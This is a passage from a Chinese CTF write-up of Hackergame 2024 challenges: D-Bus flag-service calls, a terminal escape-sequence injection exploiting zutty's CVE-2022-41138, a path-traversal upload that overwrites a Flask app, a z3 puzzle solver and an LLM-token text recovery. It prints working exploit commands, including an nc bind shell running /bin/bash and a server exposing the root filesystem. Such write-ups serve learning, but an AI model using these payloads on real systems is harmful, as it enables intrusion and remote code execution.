#include <gio/gio.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

int main() {
    GDBusConnection *connection;
    GError *error = NULL;
    GDBusMessage *message;
    GUnixFDList *fd_list;
    int mem_fd;

    mem_fd = memfd_create("genshin", MFD_ALLOW_SEALING);
    write(mem_fd, "Please give me flag2\n", 22);
    lseek(mem_fd, 0, SEEK_SET);

    char buffer[100];
    ssize_t len = read(mem_fd, buffer, sizeof(buffer) - 1);
    printf("Message: %s\n", buffer);
    printf("Compare: %d\n",g_strcmp0(buffer, "Please give me flag2\n"));

    lseek(mem_fd, 0, SEEK_SET);
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        fprintf(stderr, "Error connecting to D-Bus: %s\n", error->message);
        g_error_free(error);
        close(mem_fd);
        return 1;
    }

    // 创建一个新的 D-Bus 消息，准备发送
    message = g_dbus_message_new_method_call(
        "cn.edu.ustc.lug.hack.FlagService",         // 目标服务
        "/cn/edu/ustc/lug/hack/FlagService",         // 对象路径
        "cn.edu.ustc.lug.hack.FlagService",       // 接口名称
        "GetFlag2"                    // 方法名
    );

    // 创建 GUnixFDList 并添加文件描述符
    fd_list = g_unix_fd_list_new();
    int fd_index = g_unix_fd_list_append(fd_list, mem_fd, &error);
    if (fd_index == -1) {
        fprintf(stderr, "Error adding file descriptor to list: %s\n", error->message);
        g_error_free(error);
        g_object_unref(fd_list);
        g_object_unref(message);
        g_object_unref(connection);
        close(mem_fd);
        return 1;
    }

    // 将文件描述符列表附加到消息
    g_dbus_message_set_unix_fd_list(message, fd_list);

    // 在消息体中加入文件描述符的索引
    GVariant *body = g_variant_new("(h)", fd_index);
    g_dbus_message_set_body(message, body);

    // 发送消息并检查结果
    GDBusMessage *reply = g_dbus_connection_send_message_with_reply_sync(
        connection,
        message,
        G_DBUS_SEND_MESSAGE_FLAGS_NONE,
        -1,
        NULL,
        NULL,
        &error
    );

    if (!reply) {
        fprintf(stderr, "Error sending message: %s\n", error->message);
        g_error_free(error);
    } else {
        printf("Genshin Impact Launch!\n");

        // 获取返回的消息体
        GVariant *reply_body = g_dbus_message_get_body(reply);  // 获取返回的 GVariant

        // 检查返回的 GVariant 是否为字符串类型
        if (g_variant_is_of_type(reply_body, G_VARIANT_TYPE_STRING)) {
            const gchar *response_str = g_variant_get_string(reply_body, NULL);
            printf("Received response: %s\n", response_str);
        } else {
            fprintf(stderr, "Unexpected response type: %s\n", g_variant_print(reply_body, TRUE));
        }

        g_object_unref(reply);
    }

    // 清理资源
    g_object_unref(fd_list);
    g_object_unref(message);
    g_object_unref(connection);
    close(mem_fd);

    return 0;
}
```

{%endfolding%}

```bash
gcc -D_GNU_SOURCE -o dbus2 dbus2.c $(pkg-config --cflags --libs gio-2.0)
```

值得注意的是，这道题需要传送一个 `GUnixFDList`，在看生成的代码时，感觉这明明是 C，但就像某种面向对象语言。再次感慨 GLib 这种底层库真是伟大的工程。

第三问只需要调用 `cn.edu.ustc.lug.hack.FlagService.GetFlag3`，不需要带任何参数，但是调用者的文件名必须是 `getflag3`。对此，我的解决办法是 ...

```bash
gcc -o dbus3 dbus3.c $(pkg-config --cflags --libs gio-2.0)  # 参考上一问生成的代码
printf "#\!/bin/bash\nprintf\"" >> dbus3.sh
cat dbus3 | gzip | base64 -w0 >> dbus3.sh
printf "\" | base64 -d | gzip -d > /dev/shm/getflag3\n" >> dbus3.sh
echo "chmod +x /dev/shm/getflag3" >> dbus3.sh
echo "/dev/shm/getflag3" >> dbus3.sh
```

好一个自解压。{%icon https://imgsrc.chyk.ink/suzume_bili_thinking.webp %}

第二问和第三问我拿下了首杀哦！{%icon https://imgsrc.chyk.ink/suzumi_bili_2_koukounaodai.webp %}

---

> 最开始想出一道 DBus 的题目，是因为注意到 [AUR 上的一些旨在使用 bwrap 做桌面应用「沙盒」的包（以国产桌面应用为主）](https://aur.archlinux.org/packages?O=0&K=bwrap)，很多都直接将 session bus bind 到了沙盒环境里面。截至本 writeup 写作，AUR 上唯一一个使用 `xdg-dbus-proxy` 来做正确的 DBus 隔离的、名字里有 "bwrap" 的是 [wechat-uos-bwrap](https://aur.archlinux.org/packages/wechat-uos-bwrap?all_deps=1#pkgdeps)。如果你，作为 Linux 桌面用户，是为了隐私或者安全性选择使用沙盒方法隔离桌面应用（不然呢？），那么 DBus 这么一个可能的攻击面是需要特别关注的。

在看[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E4%B8%8D%E5%A4%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E8%BD%AF%E6%80%BB%E7%BA%BF/README.md#%E9%A2%98%E8%A7%A3)后，发现自己打的 `linuxqq-nt-bwrap` 就用了错误的做法，直接把 session bus 通到了沙盒里。虽然最近比较忙，可能没时间修正这个错误，但之后会修正，在之后也会多向大佬学习，多加注意。{%icon https://imgsrc.chyk.ink/suzume_bili_stop.webp %}

### 💻 ✅ 动画分享

小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，挂在了**几年前编译的某~~祖传~~终端模拟器**上。第一问要让这个超级安全的 server 退出，第二问要得到 `/flag2`（这个服务器并没有权限访问）的内容。

简单查看题目代码后发现，这个 `fileserver` 会把每次请求的路径打印出来，并且题目使用的祖传终端模拟器 zutty 0.12 版本存在一个重大的[安全漏洞](https://bugs.gentoo.org/868495) [CVE-2022-41138](https://nvd.nist.gov/vuln/detail/CVE-2022-41138)，会把错误的 [DECRQSS](https://vt100.net/docs/vt510-rm/DECRQSS.html) [写到终端中](https://git.hq.sig7.se/zutty.git/blobdiff/18f99e404f8be58f4a2e0f81f1dd646eb056ff1c..bde7458c60a7bafe08bbeaafbf861eb865edfa38:/src/vterm.icc)，这就给了我们可乘之机。

终端里的 `^C`，或者说 Ctrl+C 本身也是一个字符，它的 ASCII 码是 3。参考[这条回答](https://stackoverflow.com/a/77996765)，可以用 `echo -e '\x03'` 在终端里写出来一个 `^C`。于是参考文档构造 DECRQSS，用此方法拿下 flag 1。

```bash GenshinImpact.sh
#!/bin/bash
echo -ne 'GET /GenshinImpact_5.0.0.zip\eP$q\x03\e\\' | nc 127.0.0.1 8000
```

而拿到 flag 2 的方法比较特殊。`\n` 会打断 DECRQSS，所以需要用 `\r`。

我一开始的尝试是这样的：

```bash StarRail.sh
#!/bin/bash
echo -ne 'GET /StarRail_2.6.0.7z\eP$q\rexit\rchmod 777 /flag2\r\e\\' | nc 127.0.0.1 8000
sleep 1
cat /flag2
```

结果发现题目的文件系统是**只读**的，并不能直接修改 `/flag2` 的权限，也不能把 `/flag2` 拷到其它地方。

那么，既然 root 可以看到 `/flag2`，上传的脚本以 nobody 运行，看不见，所以就需要~~用分布式软总线~~用其他办法。我这里是用网络传输。

在退掉超级安全的 `fileserver` 之后，自己在其它的位置另起一个服务器，然后获得 `/flag2` 的内容。

```bash StarRail.sh
#!/bin/bash
echo -ne 'GET /StarRail_2.6.0.7z\eP$q\x03nc -n -lvvp 11451 -t -e /bin/bash\r\e\\' | nc 127.0.0.1 8000
sleep 1
echo "cat /flag2" | nc 127.0.0.1 11451 &
```

这是一次失败的尝试，在本地试验可以跑通，但不知道为什么在远程不行。{%icon https://imgsrc.chyk.ink/suzume_bili_crazy.webp %}

注意到环境里有 Python，于是可以借助 Python：

```bash
#!/bin/bash
echo -ne 'GET /StarRail_2.6.0.7z\eP$q\x03python3 -m http.server 11451 -d /\r\e\\' | nc 127.0.0.1 8000
sleep 1
curl http://127.0.0.1:11451/flag2
```

于是成功拿到 flag 2。{%icon https://imgsrc.chyk.ink/suzumi_bili_2_push.webp %}

{%image https://imgsrc.chyk.ink/eh4n7vcb4buDjOT4.webp %}

### 🔦 ⭕ 关灯

题目是 3D 版本的[关灯游戏](https://en.wikipedia.org/wiki/Lights_Out_(game))。前三问的矩阵分别为 3x3x3，5x5x5 和 11x11x11。可以使用 z3 求解得出。

{%folding child:codeblock 解题代码 %}

```python
# Generated by ChatGPT

import numpy
from z3 import *

def convert_switch_array_to_lights_array(switch_array: numpy.array) -> numpy.array:
    lights_array = numpy.zeros_like(switch_array)
    lights_array ^= switch_array
    lights_array[:-1, :, :] ^= switch_array[1:, :, :]
    lights_array[1:, :, :] ^= switch_array[:-1, :, :]
    lights_array[:, :-1, :] ^= switch_array[:, 1:, :]
    lights_array[:, 1:, :] ^= switch_array[:, :-1, :]
    lights_array[:, :, :-1] ^= switch_array[:, :, 1:]
    lights_array[:, :, 1:] ^= switch_array[:, :, :-1]
    return lights_array

def solve_puzzle(lights_string: str, n: int) -> numpy.array:
    # Initialize z3 solver
    solver = Solver()

    # Create a 3D array of z3 Bool variables
    switch_array = [[[Bool(f'switch_{i}_{j}_{k}') for k in range(n)] for j in range(n)] for i in range(n)]

    # Convert the lights_string to a numpy array
    lights_array = numpy.array(list(map(int, lights_string)), dtype=numpy.uint8).reshape(n, n, n)

    # Add constraints based on the lights_array
    for i in range(n):
        for j in range(n):
            for k in range(n):
                # Calculate the light value based on the switch_array
                light = switch_array[i][j][k]
                if i > 0:
                    light = Xor(light, switch_array[i-1][j][k])
                if i < n-1:
                    light = Xor(light, switch_array[i+1][j][k])
                if j > 0:
                    light = Xor(light, switch_array[i][j-1][k])
                if j < n-1:
                    light = Xor(light, switch_array[i][j+1][k])
                if k > 0:
                    light = Xor(light, switch_array[i][j][k-1])
                if k < n-1:
                    light = Xor(light, switch_array[i][j][k+1])

                # Add the constraint that the calculated light value must match the given lights_array
                solver.add(light == BoolVal(lights_array[i][j][k] == 1))

    # Check if the problem is solvable
    if solver.check() == sat:
        model = solver.model()
        solution = numpy.zeros((n, n, n), dtype=numpy.uint8)
        for i in range(n):
            for j in range(n):
                for k in range(n):
                    solution[i][j][k] = 1 if model.evaluate(switch_array[i][j][k]) else 0
        return solution
    else:
        raise ValueError("No solution found")

# Example usage
lights_string = input("Enter the lights string: ").strip()
n = int(input('Light dimension: '))
solution = solve_puzzle(lights_string, n)
print("Solution switch array:")
print(solution)
print("Got Flag: ", "".join(map(str, solution.flatten().tolist())))
```

{%endfolding%}

第四问的矩阵是 149x149x149，并且涉及到密码学，遂放弃。

### 😭 ✅ 禁止内卷

Hackergame，真的，卷不动了 {%icon https://imgsrc.chyk.ink/suzumi_bili_2_cry.webp %}

题目把 flag 存在了长度为 500 的分数列表里，需要给出一个长度相等的列表，之后题目会输出差的每一项的平方之和。

$$(a_1-b_1)^2+(a_2-b_2)^2+\dots+(a_{500}-b_{500})^2$$

大概就是这个样子。由小学数学的完全平方公式可知

$$(a_n-b_n)^2 = a_n^2+b_n^2-2a_nb_n$$

所以只要先传入一个 `[0] * 500`，获得分数 {a<sub>n</sub>} 的平方和，之后再分别把 {b<sub>n</sub>} 的每一项设置成 1，即可求解出 {a<sub>n</sub>} 的每一项。

```python 解题代码 ... 吗？
import requests
import re
import json

total_sum = 1604357  # 通过传全 0 json 计算得出
regexp = r"你的平方差为 (\d+)</li>"
flag = ""

for i in range(50):
    arr = [0] * 500
    arr[i] = 1
    payload = json.dumps(arr)
    response = requests.post("https://chal***.hack-challenge.lug.ustc.edu.cn:8443/submit", headers={
        "Content-Type": "multipart/form-data; boundary=---------------------------114514",
        },
    data="-----------------------------114514\r\nContent-Disposition: form-data; name=\"file\"; filename=\"aaa.json\"\r\nContent-Type: application/json\r\n\r\n" + payload + "\n\r\n-----------------------------114514--\r\n"
    )
    this_sum = int(re.search(regexp, response.text).group(1))
    this_char = chr(int((total_sum - this_sum + 1) / 2) + 65)
    flag+=this_char

print(flag)
```

最终得到 `flag{unoAAAA_esrever_now_U_run_MY_cAdeAcAAAAcbcf}` ... 吗？怎么这么多 A 呢？交上去 flag 也不对。

结合题目位置可知这绝对不是一道很简单的爬虫题，于是我把目光放到了源码中的 `get_answer` 函数：

```python
def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers
```

原来 ASCII 码小于 65 的字符（数字）全都被变成了 0（65，即 A）...

在看源码后不难留意到上传文件的部分存在巨大的漏洞：

```python
file = request.files['file']
filename = file.filename
filepath = os.path.join(UPLOAD_DIR, filename)
file.save(filepath)
```

它直接用了 `os.path.join`。结合给出的提示环境开了 `--reload`，如果我传一个文件名为 `../web/app.py` 的文件，去掉这个归一化的逻辑，是不是就能得到真正的 flag 了呢？

```python
payload = open("web.py").read()
response = requests.post("https://chal***.hack-challenge.lug.ustc.edu.cn:8443/submit", headers={
    "Content-Type": "multipart/form-data; boundary=---------------------------114514",
    },
data="-----------------------------114514\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../web/app.py\"\r\nContent-Type: text/plain\r\n\r\n" + payload + "\n\r\n-----------------------------114514--\r\n"
)
```

{%folding child:codeblock 我覆盖的 app.py 内容 %}

```python
from flask import Flask, render_template, request, flash, redirect
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

UPLOAD_DIR = "/tmp/uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)

# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)


def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
    return answers


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", results=["GenshinImpact"])


@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("你忘了上传文件")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)

    answers = get_answer()
    try:
        with open(filepath) as f:
            user = json.load(f)
    except json.decoder.JSONDecodeError:
        flash("你提交的好像不是 JSON")
        return redirect("/")
    try:
        score = 0
        for idx, i in enumerate(answers):
            score += (i - user[idx]) * (i - user[idx])
    except:
        flash("分数计算出现错误")
        traceback.print_exc()
        return redirect("/")
    # ok, update results
    results.append(score)
    with open("results.json", "w") as f:
        json.dump(results, f)
    flash(f"原神启动成功，你的平方差为 {json.dumps(answers)}")
    return redirect("/")
```

{%endfolding %}

再次进入网页，果然按照预期显示了 `第 1 名：GenshinImpact`。随意上传一个空白 json 后得到最终的 flag。

{%image https://imgsrc.chyk.ink/-HT3Icy3numJ9U3o.webp %}

```javascript
> arr.map(a=>a+65).map(n=>String.fromCharCode(n)).join('').slice(0,49)
'flag{uno!!!!_esrever_now_U_run_MY_c0de5c0060cbcf}'
```

### 🪟 ⭕ 零知识数独

第一问需要解四个数独，随意找一个在线数独求解器就可以得到 flag 1。第二问涉及到密码学中的零知识证明，遂放弃。

### 🐱 ❌ cat 绿色破解版

虽然不会做这道题，但是还是很想破解一下绿色的猫。{%icon https://imgsrc.chyk.ink/suzume_bili_agadcwsaamrcsvq.webp %} 

### 🗨️ ⭕ 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」

题目给出了一段用 [Qwen-2.5-3B-Instruct](https://modelscope.cn/models/qwen/Qwen2.5-3B-Instruct-GGUF) 生成的文字，但其中的每个 `hackergame` 都被换成了 `x`。

> In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx  sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts  xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx  xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx  xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx  lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of  xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts  to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx  lxnd of txx xisinx sun.

结合猫咪问答可知 LLM 会把语言分隔成 tokens，所以我下载这个模型的所有 token，筛选英文单词并保存下来：

```python
from transformers import AutoTokenizer

tokenizer = AutoTokenizer.from_pretrained("Qwen/Qwen2.5-3B-Instruct")
vocab = tokenizer.get_vocab()

def isalpha(string):
    for s in string:
        if ord(s) not in range(65, 91) and ord(s) not in range(97, 123):
            return False
        return True

with open("token_list.txt", "w", encoding="utf-8") as file:
    for token, token_id in vocab.items():
        if token[0] in ['Ġ', '.', '_']:
            token=token[1:]
        if isalpha(token):
            file.write(f"{token}\n")
```

之后手动替换一下 `Hackergame` 这种 tokens 里根本不可能有的词，之后对每个词遍历所有可能性，并输出：

```python
import hashlib
import itertools

after_text = open('after2.txt', 'r').read().strip()

with open('token_list.txt', 'r', encoding='utf-8') as file:
    words = file.readlines()

words = [word.strip() for word in words]

afterwords = after_text.replace(',', ' ,').replace('.', ' .').split(' ')

for i in range(len(afterwords)):
    if 'x' in afterwords[i] and afterwords[i] not in ['exploits', 'mix', 'excitement']:
        afterword = afterwords[i]
        filtered_words = [word for word in words if len(word) == len(afterword)]
        censored_words = []
        for word in filtered_words:
            text = word
            for c in "hackergame":
                text = text.replace(c, "x")
            if text == afterwords[i]:
                censored_words.append(word)

        if censored_words == []:
            print(afterword)
            print("ERROR")
            exit()

        afterwords[i] = set(censored_words)
    else:
        afterwords[i] = [afterwords[i]]

for i in afterwords:
    print(i)
```

{%folding 输出结果 %}

['In']
['the']
{'grand', 'amend', 'emand', 'egend', 'arend'}
{'rell', 'mall', 'call', 'kell', 'rall', 'hall', 'mell', 'cell', 'hell', 'gall'}
['of']
['Hackergame']
['2024']
[',']
{'wager', 'where', 'wreck', 'wreak', 'wchar'}
['the']
{'wells', 'walls'}
{'exe', 'ecc', 'xea', 'kar', 'era', 'egr', 'amm', 'acr', 'keh', 'cce', 'cea', 'mga', 'xac', 'kea', 'aga', 'mak', 'cre', 'hak', 'eea', 'xaa', 'ack', 'gre', 'acc', 'ham', 'rah', 'chr', 'xce', 'ace', 'cer', 'cxx', 'erk', 'caa', 'xec', 'car', 'mah', 'eax', 'hex', 'heg', 'cee', 'hem', 'rax', 'ram', 'crc', 'mmm', 'aka', 'ara', 'che', 'ake', 'agh', 'erh', 'mmc', 'kra', 'rak', 'aac', 'mem', 'cmc', 'mee', 'ear', 'gra', 'aca', 'eam', 'kak', 'gee', 'ere', 'hhh', 'mac', 'erm', 'rer', 'mek', 'eee', 'rek', 'gcc', 'eme', 'cke', 'akk', 'hma', 'ark', 'reg', 'hec', 'erg', 'eag', 'cka', 'xca', 'ega', 'gem', 'kem', 'chk', 'xae', 'rec', 'mma', 'xcc', 'arm', 'rag', 'rhe', 'cec', 'are', 'aea', 'meg', 'axe', 'reh', 'err', 'kah', 'aar', 'aaa', 'agr', 'exc', 'cra', 'ama', 'cae', 'cek', 'chg', 'kee', 'ger', 'eka', 'gek', 'mag', 'gag', 'gca', 'her', 'rar', 'mcc', 'ker', 'eca', 'aha', 'ech', 'geh', 'kke', 'mam', 'hmm', 'ecx', 'gae', 'egg', 'mer', 'mec', 'mex', 'eec', 'exh', 'cem', 'har', 'eer', 'gar', 'cha', 'ema', 'ehr', 'kek', 'gam', 'cac', 'arr', 'xee', 'ree', 'rex', 'rac', 'mar', 'ach', 'chc', 'cca', 'xmm', 'hek', 'kre', 'agg', 'hea', 'rch', 'kam', 'hee', 'rem', 'xhr', 'hra', 'aec', 'crm', 'arg', 'max', 'rea', 'akh', 'erc', 'arc', 'geg', 'hac', 'hxx', 'emm', 'xxx', 'cam', 'mgr', 'ccc', 'aer', 'ece', 'eah', 'ahr', 'age', 'ame'}
{'lined'}
['with']
{'screens'}
{'showing'}
['the']
['latest']
{'exploits'}
{'from', 'frog'}
['the']
['cyber']
['world']
[',']
['contestants']
{'gathered'}
['in']
['a']
{'frenzy'}
[',']
{'their'}
{'eyes', 'ayas'}
{'glued'}
['to']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'virtual'}
{'exploits'}
['.']
['The']
{'atmosphere'}
{'was', 'wcs', 'wes'}
{'electric'}
[',']
['with']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'smell', 'shell', 'shall', 'small'}
['of']
{'freshly'}
{'brewed'}
{'coffee'}
['gingling']
['with']
['the']
{'scent', 'scant'}
['of']
{'burnt'}
['Ethernet']
{'cables'}
['.']
['As']
['the']
['first']
{'challenge'}
['was']
['announced']
[',']
['a']
{'them', 'thee', 'tere', 'terr', 'tame', 'tram', 'trak', 'tega', 'ther', 'tear', 'tera', 'trer', 'take', 'trek', 'trag', 'tack', 'term', 'taxa', 'targ', 'thag', 'tree', 'tech', 'trem', 'tema', 'team'}
['of']
['hackers']
[',']
{'dressed'}
['in']
{'lab'}
{'goats', 'coats'}
['and']
{'carrying', 'marrying'}
{'laptops'}
[',']
['sprinted']
['to']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'nearest'}
{'server'}
{'goog', 'hook', 'room', 'hoog', 'cook'}
[',']
{'their'}
{'farms', 'frees', 'frags', 'fares', 'fears', 'faces'}
['a']
{'cir', 'gie', 'rim', 'kie', 'ric', 'xic', 'rix', 'rir', 'cig', 'hir', 'aic', 'gir', 'gim', 'ria', 'cie', 'hic', 'air', 'gia', 'cic', 'rig', 'eig', 'kir', 'gig', 'mim', 'mix', 'xia', 'mir', 'kim', 'him', 'rik', 'cia', 'rie', 'mia', 'mik', 'mig', 'mic', 'mie', 'aim'}
['of']
{'excitement'}
['and']
{'determination'}
['.']
['The']
{'mach', 'reak', 'crem', 'agem', 'amer', 'acer', 'agar', 'game', 'area', 'rare', 'cere', 'arma', 'arak', 'argc', 'hakk', 'amma', 'exce', 'hare', 'chac', 'accr', 'mare', 'rage', 'grac', 'mama', 'carc', 'merg', 'hamm', 'eker', 'came', 'emma', 'arga', 'erra', 'exec', 'maka', 'eger', 'crea', 'cach', 'erge', 'eree', 'rame', 'emax', 'mere', 'aram', 'cheg', 'cage', 'rama', 'cker', 'haha', 'gger', 'meer', 'emme', 'hack', 'char', 'ereg', 'hear', 'mark', 'cake', 'cram', 'erer', 'amax', 'emer', 'arch', 'rrha', 'arah', 'mech', 'hace', 'arem', 'kehr', 'reme', 'erek', 'mage', 'cccc', 'geek', 'maar', 'eher', 'rehe', 'cerc', 'acre', 'cerr', 'heck', 'exam', 'herr', 'ream', 'cree', 'race', 'acea', 'gear', 'rema', 'aker', 'mega', 'gram', 'rear', 'each', 'egra', 'merc', 'mamm', 'erah', 'agre', 'gamm', 'rack', 'gree', 'hmac', 'reek', 'xmax', 'here', 'erca', 'care', 'germ', 'rake', 'make', 'rece', 'gere', 'echa', 'marg', 'ccak', 'gage', 'maxx', 'ager', 'ecer', 'kaar', 'acam', 'amar', 'erre', 'greg', 'erce', 'xxxx', 'haar', 'arer', 'erea', 'carr', 'geme', 'amac', 'marc', 'rega', 'arme', 'agra', 'cara', 'exem', 'mehr', 'akra', 'keer', 'agma', 'garg', 'aaaa', 'acak', 'cham', 'magg', 'akah', 'earm', 'acha', 'ache', 'reck', 'arra', 'arge', 'cher', 'chem', 'akka', 'carg', 'harm', 'meme', 'eeee', 'kker'}
{'was', 'wcs', 'wes'}
['on']
[',']
['and']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'stares', 'stakes', 'stages', 'stacks'}
{'werk', 'weer', 'wear', 'weak', 'waar', 'week', 'wage', 'warm', 'were', 'ware', 'wake'}
{'mich', 'hire', 'hike', 'xima', 'kick', 'rika', 'rieg', 'migr', 'mike', 'aime', 'mice', 'rice', 'rich', 'mime', 'aire', 'kich', 'kiem', 'high', 'gigg', 'rire', 'rica', 'hier', 'aira', 'rier', 'rick', 'circ', 'gimm', 'rike'}
[',']
['with']
['the']
['ultimate']
{'prize'}
{'brink', 'bring', 'being'}
['a']
{'golden'}
{'trophy'}
['and']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'breaking'}
{'rights'}
['to']
{'sey', 'sky', 'say', 'shy'}
{'they', 'tray', 'tery'}
{'werk', 'weer', 'wear', 'weak', 'waar', 'week', 'wage', 'warm', 'were', 'ware', 'wake'}
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'best', 'bast'}
{'mt', 'ct', 'kt', 'et', 'rt', 'xt', 'gt', 'ht', 'at'}
{'checking', 'marching', 'emachine', 'cracking', 'charging', 'charming', 'reaching', 'agreeing', 'emerging', 'cheering'}
{'codes', 'modes'}
['and']
{'caching', 'harming', 'gearing', 'hacking', 'marking', 'hearing', 'arching', 'merging', 'machine', 'examine'}
{'systems'}
['in']
{'tha', 'trg', 'teg', 'tex', 'tee', 'tar', 'tam', 'ter', 'tag', 'tec', 'tax', 'tea', 'thr', 'teh', 'the', 'tah', 'tak', 'tra', 'tac', 'tek', 'tem', 'tre', 'trx'}
{'land', 'lend'}
['of']
['the']
{'aising', 'rising'}
['sun']
['.']

{%endfolding%}

靠人工读出整段话即可。其中存在 `game`、`race` 和 `gingling`、`mingling` 这种有多种可能性的词。经过多次尝试，最终恢复出完整语段：

{%ablock%}

In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.

{%endablock%}

还真是疯狂啊。交上去得到 flag 1。
